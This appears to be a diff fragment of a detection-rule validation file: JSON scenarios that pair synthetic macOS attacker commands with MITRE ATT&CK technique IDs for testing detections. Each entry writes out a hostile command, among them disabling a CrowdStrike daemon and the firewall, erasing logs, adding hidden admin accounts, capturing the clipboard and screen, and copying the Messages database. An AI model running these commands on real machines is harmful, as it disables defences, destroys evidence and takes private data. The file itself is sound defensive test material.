+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /Users/ann/Downloads/burp.cer",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553.004"
+   ]
+  },
+  {
+   "id": "val3-t1553-002-adhoc-tmp",
+   "name": "Ad hoc sign in /tmp",
+   "description": "Independent validation scenario for T1553.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/codesign",
+     "command": "codesign -s - --force /tmp/Updater",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553.002"
+   ]
+  },
+  {
+   "id": "val3-t1562-001-launchctl-bootout",
+   "name": "Security daemon booted out",
+   "description": "Independent validation scenario for T1562.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/launchctl",
+     "command": "launchctl bootout system/com.crowdstrike.falcond",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.001"
+   ]
+  },
+  {
+   "id": "val3-t1562-004-appfw-off",
+   "name": "Application firewall off",
+   "description": "Independent validation scenario for T1562.004, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
+     "command": "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.004"
+   ]
+  },
+  {
+   "id": "val3-t1070-002-diag-reports",
+   "name": "Diagnostic reports deleted",
+   "description": "Independent validation scenario for T1070.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/rm",
+     "command": "rm -rf /Users/ann/Library/Logs/DiagnosticReports",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.002"
+   ]
+  },
+  {
+   "id": "val3-t1070-002-log-erase",
+   "name": "Unified log erase",
+   "description": "Independent validation scenario for T1070.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/log",
+     "command": "log erase --all",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.002"
+   ]
+  },
+  {
+   "id": "val3-t1564-002-hidden-dscl",
+   "name": "Hidden service account",
+   "description": "Independent validation scenario for T1564.002, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/dscl",
+     "command": "dscl . create /Users/helper IsHidden 1",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1564.002"
+   ]
+  },
+  {
+   "id": "val3-t1098-dseditgroup",
+   "name": "Admin group membership via dseditgroup",
+   "description": "Independent validation scenario for T1098, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1098"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/dseditgroup",
+     "command": "dseditgroup -o edit -a eve -t user admin",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098"
+   ]
+  },
+  {
+   "id": "val3-t1136-001-sysadminctl",
+   "name": "Admin account created",
+   "description": "Independent validation scenario for T1136.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/sysadminctl",
+     "command": "sysadminctl -addUser helpdesk -fullName Help -password Passw0rd -admin",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "val3-t1115-pbpaste-loop",
+   "name": "Clipboard polled to a log",
+   "description": "Independent validation scenario for T1115, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1115"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c while true; do pbpaste; sleep 1; done >> /tmp/clip.log",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1115"
+   ]
+  },
+  {
+   "id": "val3-t1113-hidden-capture",
+   "name": "Silent screenshots into a hidden folder",
+   "description": "Independent validation scenario for T1113, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1113"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/screencapture",
+     "command": "screencapture -x -C /private/tmp/.s/1700000000.png",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1113"
+   ]
+  },
+  {
+   "id": "val3-t1005-chatdb-cp",
+   "name": "Messages database copied",
+   "description": "Independent validation scenario for T1005, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp /Users/ann/Library/Messages/chat.db /tmp/c.db",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1005"
+   ]
+  },
+  {
+   "id": "val3-t1090-secure-proxy",
+   "name": "System HTTPS proxy set to remote host",
+   "description": "Independent validation scenario for T1090, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1090"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/networksetup",
+     "command": "networksetup -setsecurewebproxy Wi-Fi 198.51.100.4 8443",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1090"
+   ]
+  },
+  {
+   "id": "val3-t1518-001-snitch",
+   "name": "Little Snitch discovery",
+   "description": "Independent validation scenario for T1518.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1518.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c ps aux | grep -i \"little snitch\"",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1518.001"
+   ]
+  },
+  {
+   "id": "val3-t1518-001-objsee-ls",
+   "name": "Objective-See directory listing",
+   "description": "Independent validation scenario for T1518.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1518.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/ls",
+     "command": "ls /Library/Application Support/Objective-See",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1518.001"
+   ]
+  },
+  {
+   "id": "val3-t1497-001-vmm",
+   "name": "hv_vmm_present check",
+   "description": "Independent validation scenario for T1497.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1497.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/sysctl",
+     "command": "sysctl -n kern.hv_vmm_present",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1497.001"
+   ]
+  },
+  {
+   "id": "val3-t1574-006-launchctl-dyld",
+   "name": "DYLD var set via launchctl",
+   "description": "Independent validation scenario for T1574.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/launchctl",
+     "command": "launchctl setenv DYLD_INSERT_LIBRARIES /Users/Shared/inj.dylib",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1574.006"
+   ]
+  },
+  {
+   "id": "val3-t1569-001-submit",
+   "name": "launchctl submit",
+   "description": "Independent validation scenario for T1569.001, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1569.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/launchctl",
+     "command": "launchctl submit -l com.x.helper -- /bin/bash -c /tmp/.a",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1569.001"
+   ]
+  },
+  {
+   "id": "val3-t1070-006-setfile",
+   "name": "SetFile date forging",
+   "description": "Independent validation scenario for T1070.006, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/SetFile",
+     "command": "SetFile -m 03/04/2016 10:00:00 /Users/Shared/.agent",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.006"
+   ]
+  },
+  {
+   "id": "val3-t1553-profiles",
+   "name": "Profile install",
+   "description": "Independent validation scenario for T1553, written from public ATT&CK procedure descriptions and common tradecraft write-ups, not from the rules' samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/profiles",
+     "command": "profiles install -type=configuration -path /Users/Shared/corp.mobileconfig",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1553"
+   ]
+  }
+ ]
+}
